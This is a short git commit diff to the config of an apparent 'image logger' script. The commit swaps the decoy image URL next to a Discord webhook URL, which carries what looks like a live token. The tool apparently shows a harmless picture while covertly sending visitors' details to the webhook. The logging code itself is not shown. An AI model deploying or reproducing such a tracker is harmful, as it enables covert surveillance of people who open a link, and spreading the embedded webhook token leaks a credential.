d52957910250c2497e849520bf6a7682d44323ac
Levicron <116033956+Levicron@users.noreply.github.com>
2025-04-15 02:27:47 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1361510848228753648/DMifEGHqJl80MLoNfDguPeZq25BisO2vYhDVGGt1F5XOcCPEDc22StC9_qHUhJC9ro2p",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://files.worldwildlife.org/wwfcmsprod/images/Bornean_Orangutan_Why_They_Matter_1/carousel_small/49fb2e0squ_Bornean_Orangutan_8.1.2012_whytheymatter1_HI_279157.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
